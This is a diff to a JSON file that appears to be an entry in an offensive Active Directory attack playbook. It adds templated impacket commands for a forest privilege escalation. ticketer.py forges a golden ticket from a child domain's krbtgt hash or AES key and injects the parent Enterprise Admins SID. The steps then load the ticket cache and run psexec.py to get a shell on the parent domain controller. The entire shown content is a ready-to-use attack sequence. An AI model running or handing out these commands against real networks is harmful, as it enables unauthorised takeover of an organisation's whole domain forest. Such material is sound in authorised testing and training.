@@ -83,5 +83,25 @@
   },
   "tools": [
     "impacket"
+  ],
+  "variations": [
+    {
+      "label": "AES key instead of RC4",
+      "command": "ticketer.py -aesKey <child_krbtgt_aes> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_ea_sid> -user-id 500 Administrator"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Forge golden ticket with extra EA SID",
+      "command": "ticketer.py -nthash <child_krbtgt_hash> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_ea_sid> Administrator"
+    },
+    {
+      "label": "Load the ccache",
+      "command": "export KRB5CCNAME=Administrator.ccache"
+    },
+    {
+      "label": "Access the parent DC",
+      "command": "psexec.py -k -no-pass <child_domain>/Administrator@<parent_dc_fqdn>"
+    }
   ]
 }
